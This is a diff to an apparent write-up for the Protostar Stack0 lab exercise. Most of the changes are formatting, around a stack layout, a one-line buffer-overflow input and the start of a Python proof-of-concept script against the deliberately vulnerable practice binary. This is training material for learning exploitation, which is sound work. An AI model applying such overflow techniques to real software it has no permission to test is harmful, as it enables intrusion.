@@ -4,8 +4,8 @@ https://exploit-exercises.com/protostar
 
 NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!
 
-Stack0
-============================================
+##Stack0
+
 
 int main(int argc, char **argv)
 {
@@ -22,17 +22,17 @@ int main(int argc, char **argv)
   }
 }
 
-Stack looks like:
+###Stack looks like:
  ---------------------------------------
 | eip | ebp | modified(0) |   buffer    |
  ---------------------------------------
 fill buffer with gets 
 since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified
 
-winning command:
+###winning command:
 python -c "print 'a'*64+'1'" | ./stack0
 
-Python exploit script for this challenge
+###Python exploit script for this challenge
 from subprocess import Popen, PIPE
 ################
 buffer = 64
@@ -44,5 +44,5 @@ print cproc.communicate(input)[0]
 
 
 ---------------------------------------------------------------------------------------------------------------------
-Stack1
+##Stack1
 
